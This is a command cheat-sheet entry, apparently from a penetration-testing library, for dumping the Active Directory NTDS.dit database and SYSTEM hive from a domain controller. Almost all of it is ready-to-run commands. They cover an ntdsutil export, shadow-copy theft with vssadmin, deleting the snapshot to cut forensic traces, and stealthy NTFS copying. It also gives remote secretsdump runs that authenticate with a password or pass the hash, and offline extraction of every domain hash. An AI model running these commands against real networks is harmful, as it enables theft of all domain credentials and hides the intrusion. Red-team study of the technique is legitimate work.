---
technique: NTDSDump
category: credential-dumping
protocols: SMB, RPC
remote_capable: true
tags: ntds credential-dumping domain-controller dit database ad
---

# NTDSDump

NTDS.dit is the Active Directory database stored on every domain controller. It holds NT hashes, Kerberos keys, and optionally cleartext passwords for every domain account. Because the file is locked by AD processes at runtime, exfiltration requires a shadow copy, VSS snapshot, or AD maintenance tooling. After export, both the NTDS.dit and the SYSTEM hive are needed to decrypt secrets.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Local admin / DA | Required to create VSS snapshots or run ntdsutil on a DC |
| SYSTEM hive | Required alongside ntds.dit to decrypt credential material |

## Windows

### ntdsutil (IFM snapshot)

#cmd #native #ntds-export

Create a defragmented NTDS snapshot using ntdsutil's Install-From-Media mode; produces ntds.dit and the SYSTEM hive under the output path.

```cmd title:"Export NTDS via ntdsutil IFM"
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```
<!-- cheat -->

### Step 1: Create VSS snapshot (vssadmin)

#cmd #native #vss #ntds-export

Create a Volume Shadow Copy of the C drive to access locked NTDS.dit and SYSTEM files.

```cmd title:"Create VSS snapshot of C drive with vssadmin"
vssadmin create shadow /for=C:
```
<!-- cheat -->

### Step 2: Copy NTDS.dit from shadow (vssadmin)

#cmd #native #vss #ntds-export

Copy NTDS.dit out of the newly created shadow copy.

```cmd title:"Copy NTDS.dit from VSS shadow"
copy "$shadow_copy_name\Windows\NTDS\NTDS.dit" C:\Windows\Temp\ntds.dit.save
```
<!-- cheat
var shadow_copy_name
-->

### Step 3: Copy SYSTEM hive from shadow (vssadmin)

#cmd #native #vss #ntds-export

Copy the SYSTEM hive out of the newly created shadow copy.

```cmd title:"Copy SYSTEM hive from VSS shadow"
copy "$shadow_copy_name\Windows\System32\config\SYSTEM" C:\Windows\Temp\system.save
```
<!-- cheat
var shadow_copy_name
-->

### Step 4: Delete VSS snapshot (vssadmin)

#cmd #native #vss #cleanup

Delete the shadow copy after exfiltrating the files to reduce forensic footprint.

```cmd title:"Delete VSS shadow copy with vssadmin"
vssadmin delete shadows /shadow="$shadow_copy_id"
```
<!-- cheat
var shadow_copy_id
-->

### Invoke-NinjaCopy

#powershell #powersploit #ntds-export #stealth

Copy NTDS.dit by parsing the raw NTFS structure rather than requesting a shadow copy, reducing forensic footprint.

```powershell title:"Export NTDS by parsing NTFS with Invoke-NinjaCopy"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
```
<!-- cheat -->

## Linux

### secretsdump (VSS remote, password auth)

#impacket #smb #vss #ntds-dump #remote

Remotely dump NTDS by triggering a VSS snapshot on the target DC over SMB with a plaintext password.

```sh title:"Remote NTDS dump via secretsdump VSS with password"
secretsdump.py -use-vss -outputfile ntds_out -dc-ip "$rhost_ip" "$domain/$user:$pass@$dc_host"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_host
-->

### secretsdump (VSS remote, NT hash auth)

#impacket #smb #vss #ntds-dump #remote #pth

Remotely dump NTDS by triggering a VSS snapshot on the target DC over SMB with an NT hash.

```sh title:"Remote NTDS dump via secretsdump VSS with NT hash"
secretsdump.py -use-vss -outputfile ntds_out -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -dc-ip "$rhost_ip" "$domain/$user@$dc_host"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var dc_host
-->

### secretsdump (offline parse)

#impacket #offline #ntds-parse

Parse a previously exfiltrated ntds.dit and SYSTEM hive offline to extract all domain hashes.

```sh title:"Parse exfiltrated NTDS.dit offline with secretsdump"
secretsdump.py -ntds ntds.dit.save -system system.save LOCAL
```
<!-- cheat -->

### gosecretsdump

#go #offline #ntds-parse

Parse a large ntds.dit file faster than impacket's secretsdump using the Go implementation.

```sh title:"Parse large NTDS.dit offline with gosecretsdump"
gosecretsdump -ntds ntds.dit.save -system system.save
```
<!-- cheat -->

### ntdsdotsqlite (without credentials)

#python #offline #ntds-parse #extended

Extract the full AD directory structure from ntds.dit into a queryable SQLite database without credential decryption.

```sh title:"Extract NTDS to SQLite without credential decryption"
ntdsdotsqlite ntds.dit -o ntds.sqlite
```
<!-- cheat -->

### ntdsdotsqlite (with SYSTEM hive)

#python #offline #ntds-parse #extended

Extract the full AD directory including decrypted credentials from ntds.dit into a queryable SQLite database.

```sh title:"Extract NTDS to SQLite with credential decryption via SYSTEM hive"
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
<!-- cheat -->
